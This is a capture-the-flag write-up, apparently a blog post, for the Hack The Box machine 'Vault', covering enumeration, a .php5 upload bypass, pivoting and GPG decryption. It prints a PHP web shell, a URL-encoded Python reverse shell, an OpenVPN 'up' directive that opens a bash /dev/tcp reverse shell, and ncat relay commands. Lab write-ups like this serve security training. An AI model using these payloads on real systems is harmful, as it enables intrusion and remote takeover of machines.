---
title: HTB Vault Writeup
date: 2024-12-21
categories: [CTF, HTB]
tags: [CTF, HTB, Medium]
description: HTB Vault Writeup
---
# Nmap
```bash
nmap -Pn -v -p- -sV --min-rate 1000 vault.htb -oN vault_nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

# Foothold (Port 80)
Main page hints there is possibly a directory related to "sparklays"
![Screenshot](/assets/img/vault-writeup-screenshot/image_1.png)
Turns out there is a directory under http://vault.htb/sparklays
![Screenshot](/assets/img/vault-writeup-screenshot/image_1_1.png)

Fuzzing with Gobuster
```bash
gobuster dir -u http://vault.htb/sparklays -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays.txt
```

Subdirectory in sparklays/design
```bash
gobuster dir -u http://vault.htb/sparklays/design -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,php -o vault.htb_sparklays_design.txt
```

![Screenshot](/assets/img/vault-writeup-screenshot/image_3.png)

Found admin login page at admin.php
```
http://vault.htb/sparklays/admin.php
```

![Screenshot](/assets/img/vault-writeup-screenshot/image_2.png)

Another page names design.html
```
http://vault.htb/sparklays/design/design.html
```
![Screenshot](/assets/img/vault-writeup-screenshot/image_4.png)
The link leads to
```
http://vault.htb/sparklays/design/changelogo.php
```
![Screenshot](/assets/img/vault-writeup-screenshot/image_5.png)

Uploading test.png returns success
![Screenshot](/assets/img/vault-writeup-screenshot/image_5_1.png)

And the file can be viewed at
```
http://vault.htb/sparklays/design/uploads/<filename>
```

But uploading test.php returns a failed message
![Screenshot](/assets/img/vault-writeup-screenshot/image_5_2.png)

Fuzzing with Burp Intruder shows that it allows uploading .php5 files
![Screenshot](/assets/img/vault-writeup-screenshot/image_5_3.png)

Uploading a simple file to test code execution with system()
```php
<?php
echo "hello\n";
system($_GET['cmd']);
?>
```
can use system()

![Screenshot](/assets/img/vault-writeup-screenshot/image_6.png)
Reverse shell from revshells.com
```bash
# Python3 #2 URL encoded
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.24%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22bash%22%29%27
```

![Screenshot](/assets/img/vault-writeup-screenshot/image_7.png)
# User.txt

![Screenshot](/assets/img/vault-writeup-screenshot/image_8.png)

SSH password in /home/dave/Desktop
![Screenshot](/assets/img/vault-writeup-screenshot/image_9.png)

![Screenshot](/assets/img/vault-writeup-screenshot/image_10.png)
Further enumeration shows:
- IP address for other servers
- A potential password or encryption key
![Screenshot](/assets/img/vault-writeup-screenshot/image_11.png)

No nmap installed, therefore using a bash script to scan for ports (https://github.com/mnorin/bash-scripts/blob/master/utils/portscan.sh)

![Screenshot](/assets/img/vault-writeup-screenshot/image_12.png)

Tunnel to DNS + Configurator server
```bash
ssh -L 8888:192.168.122.4:80 dave@vault.htb
```

Main page
![Screenshot](/assets/img/vault-writeup-screenshot/image_13.png)

Second link goes to
```
http://192.168.122.4/vpnconfig.php?function=testvpn
```
![Screenshot](/assets/img/vault-writeup-screenshot/image_14.png)

This suggests that it allows editing and executing a .ovpn file.

There is a blog post about code execution using ovpn files. (https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da)

.ovpn file used
```
remote 192.168.122.4
nobind
dev tun
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/8080 0<&1 2>&1&'"
```

The flag is in /home/dave/user.txt
![Screenshot](/assets/img/vault-writeup-screenshot/image_15.png)

# Root.txt
SSH password for dave on 192.168.122.4 (DNS) is in home directory
![Screenshot](/assets/img/vault-writeup-screenshot/image_16.png)

Checking /etc/hosts shows the IP of the Vault server
![Screenshot](/assets/img/vault-writeup-screenshot/image_17.png)

![Screenshot](/assets/img/vault-writeup-screenshot/image_18.png)

Interesting commands to add routes to Vault subnet
```bash
http://192.168.1.11:8888/DNS.zip

root@DNS:/var/www/DNS# cat interfaces 
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
```
However, the IP does not seem to be reachable.
# Checked Writeup (Got Stuck Here)
Issue:
- Identified the target IP to pivot to, but cannot seem to reach the server

Checked writeup at this point (https://0xdf.gitlab.io/2019/04/06/htb-vault.html)

So by grepping the IP under log files, there are previously ran command that hints on how the users reached the DNS server from Vault
```bash
grep -rHa "192.168.5.2" /var/log
```

Commands previously ran by dave
![Screenshot](/assets/img/vault-writeup-screenshot/image_19.png)
```
/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

Creates a tunnel with a certain source port (as ssh cannot specify source port)
- that's why nmap returned nothing, as it only allow traffic with src port 53 or 4444

```bash
/usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
```

Then ssh as dave, same password as before
```bash
ssh dave@127.0.0.1 -p 1234
```

![Screenshot](/assets/img/vault-writeup-screenshot/image_20.png)

A root.txt.gpg file in the home directory
![Screenshot](/assets/img/vault-writeup-screenshot/image_21.png)

Listing keys on each host
```bash
gpg --list-keys
```

There is a key on ubuntu host (first host)

![Screenshot](/assets/img/vault-writeup-screenshot/image_22.png)

Copy file from vault to ubuntu using scp
```bash
# From vault to DNS
scp -P 1234 dave@127.0.0.1:~/root.txt.gpg .

# From DNS to ubuntu
scp dave@192.168.122.4:~/root.txt.gpg .
```

Decrypt with passphrase shown in /home/dave/Desktop/key
![Screenshot](/assets/img/vault-writeup-screenshot/image_23.png)
# Just for fun
## Shell breakout
https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e
Method -3
```bash
ssh dave@127.0.0.1 -p 1234 -t bash
```
